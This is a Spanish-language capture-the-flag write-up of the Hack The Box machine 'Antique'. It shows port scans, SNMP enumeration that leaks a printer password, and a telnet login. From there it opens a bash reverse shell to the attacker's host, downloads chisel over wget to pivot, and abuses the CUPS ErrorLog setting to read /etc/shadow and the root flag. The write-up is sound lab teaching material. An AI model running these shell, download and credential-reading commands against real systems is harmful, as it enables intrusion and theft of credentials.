# HACK THE BOX PEN - TESTING LABS
## MACHINE ANTIQUE
> ![alt text](https://i.postimg.cc/4yszzy7r/Antique.png)
---

### Sinopsis 
Antique es una máquina Linux fácil con una impresora de red que revela credenciales a través de una cadena *SNMP* lo que permite iniciar sesión en el servicio *telnet*. El punto de apoyo se puede obtener explotando una característica en la impresora. Este servicio se puede explotar aún más para obtener acceso root en el servidor.
### Habilidades Aprendidas

> * Enumeración y escaneo.
>   * Puertos TCP y UDP.
> * SNMP (enumeración).
> * Configuración de proxy/pivote local.
> * Conexion remota con telnet.
> * Ganar acceso con shell reversa
> * Explotación de Administración CUPS V 1.6.1 .
> * Explotación de Administración CUPS V 1.6.1 .

> * Explotación de Administración CUPS V 1.6.1 .
>   * Chisel
>   * Remot port ipforwarding

## Enumeración y Escaneo

Para iniciar la fase de reconocimiento, se puede verificar la conectividad del equipo víctima; para esto se puede usar el protocolo _ICMP_, y con el _ttl_ obtenido se puede verificar la version del sistema.

#### Validación de conectividad.
```bat
ping -c 1 10.10.11.107
PING 10.10.11.107 (10.10.11.107) 56(84) bytes of data.
64 bytes from 10.10.11.107: icmp_seq=1 ttl=63 time=91.7 ms

--- 10.10.11.107 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 91.713/91.713/91.713/0.000 ms

```
>*_Nota_*: el parametro *_-c_* de la traza icmp, permite enviar los paquetes asignados para la prueba, en el ejemplo anterior un solo paquete. Y como se pude interpretar, el ttl corresponde a una maquina linux.

### Escaneo y enumeración de servicios
Para la etapa de identificación de viulnerabilidades utilizamos la herramienta *_nmap_*, que servirá para verificar los servicioes y puertos expuestos.

#### Identicación de puertos y servicios con nmap. 65535 Puertos.
```bat
# nmap -p- --open -T5 -v -n -oG allPorts 10.10.11.107
# nmap  -p- --open -sS --min-rate 5000-vvv -n -Pn 10.10.11.107 -oG allPorts
```
A continuación el significado de los parametros de nmap.

>* *_-p-_*: Ejecuta la validación sobre todos los puertos 65535.
>* *_-T[0-5]_*: Corresponde a la plantilla del temporizado entre mas alto es el numero, el escaneo es mas rapido y mas ruidoso o intrusivo, el numero 5 es ideal para entornos controlados.
>* *_-v_*: Aumentar el nivel de mensajes detallados (use -vvv para aumentar el efecto).
>* *_-n_*: Le indica a Nmap que nunca debe realizar resolución DNS inversa de las direcciones IP activas que encuentre. Ya que DNS es generalmente lento, esto acelera un poco las cosas.
> * *_-Pn_*: Este parametro evita que se aplique resolución de host discovery, a travéz del protocolo arp.
> * *_-oG_*: -oN/-oX/-oS/-oG \<file>: Guardar el sondeo en formato normal, y Grepeable (para usar con grep) respectivamente, al archivo indicado.
> * *_sS_*: Análisis TCP SYN/Connect()/ACK.
> * *_--min-rate 5000_*: emite paquete no mas lentos a 5000 paquetes por segundo.
> * *_--open_*: muestra solo los puertos abiertos.

#### Resultado formato grepeable -oG

```bat
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: allPorts
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.92 scan initiated Wed Jul 13 19:58:41 2022 as: nmap -p- --open -T5 -v -n -oG allPorts 10.10.11.107
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 10.10.11.107 ()   Status: Up
   4   │ Host: 10.10.11.107 ()   Ports: 23/open/tcp//telnet///
   5   │ # Nmap done at Wed Jul 13 20:10:34 2022 -- 1 IP address (1 host up) scanned in 713.13 seconds
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Una vez escaneado se puede evidenciar que encontró abierto los puertos 23, para lo que se puede ejecutar un escaneo mejorado a nivel se scritps con nmap.

```bat
    nmap -p23 -sCV 10.10.11.107 -oN targeted 
```

A continuación el significado de los parametros de nmap.

>* *_-sC_*: Escanee conn scripts básicos de enumeración.
>* *_-sV_*: Detecta la version y servicio que corren para los puertos.
>* *_-p23_*: Que el escanee se ejecute sobre esos puertos.
>* *_-oN_*: Exporte en formato nmap.

````bat 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targeted
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.92 scan initiated Wed Jul 13 20:13:14 2022 as: nmap -p23 -sCV -oN targeted 10.10.11.107
   2   │ Nmap scan report for 10.10.11.107 (10.10.11.107)
   3   │ Host is up (0.099s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 23/tcp open  telnet?
   7   │ | fingerprint-strings: 
   8   │ |   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Ja
       │ vaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOpti
       │ ons, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, g
       │ iop, ms-sql-s, oracle-tns, tn3270: 
   9   │ |     JetDirect
  10   │ |     Password:
  11   │ |   NULL: 
  12   │ |_    JetDirect
  13   │ 1 service unrecognized despite returning data. If you know the service/version, please submit the following finge
       │ rprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
  14   │ SF-Port23-TCP:V=7.92%I=7%D=7/13%Time=62CF6DB2%P=x86_64-pc-linux-gnu%r(NULL
  15   │ SF:,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPas
  16   │ SF:sword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetReq
  17   │ SF:uest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x2
  18   │ SF:0JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nPa
  19   │ SF:ssword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNS
  20   │ SF:VersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatusR
  21   │ SF:equestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20J
  22   │ SF:etDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nPa
  23   │ SF:ssword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword:
  24   │ SF:\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerbe
  25   │ SF:ros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20J
  26   │ SF:etDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPasswor
  27   │ SF:d:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r
  28   │ SF:(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19,
  29   │ SF:"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDire
  30   │ SF:ct\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\x
  31   │ SF:20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(TerminalSe
  32   │ SF:rver,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDire
  33   │ SF:ct\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x20
  34   │ SF:")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19,"
  35   │ SF:\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDirect
  36   │ SF:\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20")
  37   │ SF:%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20JetD
  38   │ SF:irect\n\nPassword:\x20");
  39   │ 
  40   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  41   │ # Nmap done at Wed Jul 13 20:16:20 2022 -- 1 IP address (1 host up) scanned in 185.25 seconds
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
````
En los escaneado ejecutados se pudo evidenciar que a nivel puertos TCP, no se logro encontrar puertos abiertos, por lo que, se debe enumerar servicios a nivel puertos UDP.

```bat
  sudo nmap -p- -sU --min-rate 4000 10.10.11.107 -vvv -Pn -n -oG allPortsU 
```
A continuación el significado de los parametros de nmap.

>* *_-sU_*: Escaneo a nivel puertos UDP.

En el escaneo ejecutado se encontró abierto el puerto 161, para obtener mayores detalles del puerto, se debe ejecutar otro escaneo con mayor detalle.

```bat
  sudo nmap -p161 -sU -sCV 10.10.11.107 -oN targetedU
```
En los resultados se puede evidenciar que tenemos una posible ruta de ingreso, a nuvel del servicio SNMP. 

```bat
───────┬──────────────────────────────────────────────────────────────────────────────────
       │ File: targetedU
───────┼──────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.92 scan initiated Wed Jul 13 22:58:22 2022 as: nmap -p161 -sU -sCV -oN t
       │ argetedU 10.10.11.107
   2   │ Nmap scan report for 10.10.11.107 (10.10.11.107)
   3   │ Host is up (0.11s latency).
   4   │ 
   5   │ PORT    STATE SERVICE VERSION
   6   │ 161/udp open  snmp    SNMPv1 server (public)
   7   │ 
   8   │ Service detection performed. Please report any incorrect results at https://nmap.
       │ org/submit/ .
   9   │ # Nmap done at Wed Jul 13 22:58:31 2022 -- 1 IP address (1 host up) scanned in 8.
       │ 86 seconds
───────┴──────────────────────────────────────────────────────────────────────────────────
```
## Enumeracion de servicio SNMP

Podemos enumerar el servicio SNMP, utilizando la herramienta snmpwalk

```bat
snmpwalk -c public -v2c 10.10.11.107
```
como salida podremos tener las dos posibles respuestas

#### Salida 1
>```bat
>iso.3.6.1.2.1 = STRING: "HTB Printer"
>```
#### Salida 2
>```bat
>SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
>```

*_Nota_*: la salida dependera de como este configurado el archivo /etc/snmp/snmp.conf, en tu maquina local o equipo atacante.

Volvemos a utilizar la herramienta snmwalk, para ver si encontramos mas información del servicios, pero esta vez agregamos un flag en valor 1
>```bat
>snmpwalk -c public -v2c 10.10.11.107 1
>```

como resultado obtendremos la siguiente información.

#### Resultado
>```bat
>SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
>SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
>33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
>SNMPv2-SMI::enterprises.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
>```

En el resultado anterior se puede evidenciar una cadena hexadecimal que se encuentra despues del parametro BITS:, para decifrarla se puede usar la herramienta *_xdd_*

>```bat
>echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
>33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xargs | xxd -ps -r
>```

El reusltado de descifrar la cadena hexadecimal es el siguiente:

#### Resultado
>```bat
>P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i   IYaA"1&1A5%
>```
*_Nota_*: Se puede deducir que el resultado de la cadena se encuentra en la primera parte e la cadena obtenida, hasta 8i.

Con la contrasela obtenida podemo utilizar el servicio telnet para verificar si podemos tener acceso al equipo antique.

>```python
>telnet 10.10.11.107 23
>Trying 10.10.11.107...
>Connected to 10.10.11.107.
>Escape character is '^]'.
>HP JetDirect
>Password: P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i
>Please type "?" for HELP
>```

#### Presionamos ?
>```python
>?
>To Change/Configure Parameters Enter:
>Parameter-name: value <Carriage Return>
>
>Parameter-name Type of value
>ip: IP-address in dotted notation
>subnet-mask: address in dotted notation (enter 0 for default)
>default-gw: address in dotted notation (enter 0 for default)
>syslog-svr: address in dotted notation (enter 0 for default)
>idle-timeout: seconds in integers
>set-cmnty-name: alpha-numeric string (32 chars max)
>host-name: alpha-numeric string (upper case only, 32 chars max)
>dhcp-config: 0 to disable, 1 to enable
>allow: <ip> [mask] (0 to clear, list to display, 10 max)
>addrawport: <TCP port num> (<TCP port num> 3000-9000)
>deleterawport: <TCP port num>
>listrawport: (No parameter required)
>exec: execute system commands (exec id)
>exit: quit from telnet session
>```

Cuando tenemos acceso se puede utilizar bash para ejecutar una conexion de shell reversa, previo a esto, establecemos una conexion en modo escucha utilizando el servicio nc

>```bat
> sudo nc -nlvp 1104
> listening on [any] 1104 ...
>```
Con el servicio de nc listo, establecemos la conexion utilizando una bash interactiva que apunte al equipo atacante y el puerto abierto
>```bat 
> exec bash -c "bash -i >& /dev/tcp/10.10.16.5/1104 0>&1"
>```
##### Resultado de la shell reversa
>```python
>listening on [any] 1104 ...
>connect to [10.10.16.5] from (UNKNOWN) [10.10.11.107] 48646
>bash: cannot set terminal process group (1002): Inappropriate ioctl for device
>bash: no job control in this shell
>lp@antique:~$ 
>```
Una vez ganado acceso se pude obtener información del archivo user.txt como resultado de la primera flag.
>```bash
>lp@antique:~$ ls -la 
>total 16
>drwxr-xr-x 2 lp   lp   4096 Sep 27  2021 .
>drwxr-xr-x 6 root root 4096 May 14  2021 ..
>lrwxrwxrwx 1 lp   lp      9 May 14  2021 .bash_history -> /dev/null
>-rwxr-xr-x 1 lp   lp   1959 Sep 27  2021 telnet.py
>-rw------- 2 lp   lp     33 Aug  9 03:48 user.txt
>lp@antique:~$ cat user.txt 
>3483068056ab2689c8be47c31ba3e694
>lp@antique:~$ 
>```

## Elevación de privilegios

Cuando ganamos acceso podemos verificar si hay algun tipo de servicio corriento internamente, y este se puede buscar con la herramienta netsat
>```bash
>lp@antique:~$ netstat -putona
>(Not all processes could be identified, non-owned process info
>will not be shown, you would have to be root to see it all.)
>Active Internet connections (servers and established)
>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer
>tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1037/python3         off (0.00/0/0)
>tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
>tcp        0      0 10.10.11.107:23         10.10.16.5:60458        ESTABLISHED 1037/python3         off (0.00/0/0)
>tcp        0    292 10.10.11.107:57896      10.10.16.5:1104         ESTABLISHED 1174/bash            on (0.30/0/0)
>tcp6       0      0 ::1:631                 :::*                    LISTEN      -                    off (0.00/0/0)
>udp        0      0 10.10.11.107:50917      8.8.8.8:53              ESTABLISHED -                    off (0.00/0/0)
>udp        0      0 0.0.0.0:161             0.0.0.0:*                           -                    off (0.00/0/0)
>lp@antique:~$ 
>```
*_Nota:_* En la lista anterios se puede verifar que existe un servicio corriendo internamento en el puerto *_127.0.0.1:631_*; para verificar que servicio esta corriendo de manera interna se puede utilizar la herramienta [chisel](https://github.com/jpillora/chisel), para hacer port forwarding 

>```bash
>git clone https://github.com/jpillora/chisel.git
>Clonando en 'chisel'...
>remote: Enumerating objects: 2057, done.
>remote: Total 2057 (delta 0), reused 0 (delta 0), pack-reused 2057
>Recibiendo objetos: 100% (2057/2057), 3.43 MiB | 3.83 MiB/s, listo.
>Resolviendo deltas: 100% (963/963), listo.
>```
Compilamos el script de chisel, basado el go, y el comando upx para reducir mas el archivo
>```bat
>cd chisel
>go build -ldflags="-s -w" .
>upx chisel
>```
Con el archivo comprimido, y para compartir el archivo con equipo se puede usar un servidor web con python3.

#### Creación servidor web
>```bash
> sudo python3 -m http.server 2106
>```

Desde el servidor web utilizamos la herramienta wget 
#### Descarga de chisel desde un server web
>```bash
>lp@antique:~$ cd /tmp && wget http://10.10.16.5:2106/chisel
>--2022-08-09 05:03:30--  http://10.10.16.5:2106/chisel
>Connecting to 10.10.16.5:2106... connected.
>HTTP request sent, awaiting response... 200 OK
>Length: 3125304 (3.0M) [application/octet-stream]
>Saving to: ‘chisel’
>
>chisel              100%[===================>]   2.98M   767KB/s    in 6.4s    
>
>2022-08-09 05:03:36 (480 KB/s) - ‘chisel’ saved [3125304/3125304]
>
>lp@antique:/tmp$ 
>lp@antique:/tmp$ chmod +x chisel
>lp@antique:/tmp$ ls -la | grep chisel 
>-rwxrwxr-x  1 lp   lp   3125304 Aug  9 04:54 chisel
>```
### Port Forwarding
Para crear el port forwarding, ejecutar el desde el equipo atacante que funcionara como server el siguiente comando:

#### Maquina local o server
>```bat
>sudo ./chisel server -p 8000 --reverse
>```


#### Maquina victima "antique" o cliente
>```bash
>lp@antique:/tmp$ ./chisel client 10.10.16.5:8000 R:631:127.0.0.1:631
>2022/08/19 03:26:56 client: Connecting to ws://10.10.16.5:8000
>2022/08/19 03:26:58 client: Connected (Latency 82.85672ms)
>```

Para verificar el la conexion de port forwarding ingresamos al explorador porla ruta local *_http://127.0.0.1:631/_*
> ![alt text](https://i.postimg.cc/66HFt4QG/cups.png)

En la imagen anterior se puede evidenciar que en el puerto 631, muestra al pagina de administración del servicio cups 1.6.1, por lo que se puede validar con search exploit si es vulnerable. Se puede ver que en el menu de adminisración hay la opcion ver archivos de registros, y ErrorLog, muestra los registros de error.log.
> ![alt text](https://i.postimg.cc/qvkPrffj/cups2.png)

Como el servicio de administración utiliza privilegios de root, se puede uitilizar el comando cupsctl para cambiar la ruta de la variable Erro_log

>```bash
>cupsctl ErrorLog="/etc/shadow"
>lp@antique:/tmp$ curl -s -X GET http://localhost:631/admin/log/error_log
>root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
>daemon:*:18375:0:99999:7:::
>bin:*:18375:0:99999:7:::
>sys:*:18375:0:99999:7:::
>sync:*:18375:0:99999:7:::
>games:*:18375:0:99999:7:::
>man:*:18375:0:99999:7:::
>```

Ahora podemos utilizar cupstl para mostrar el contenido del archivo root.txt

>```rubi
>lp@antique:~$ cupsctl ErrorLog="/root/root.txt"
>lp@antique:~$ curl -s -X GET http://localhost:631/admin/log/error_log
>1f9853e434974f52ce9dc347e4519e13
>```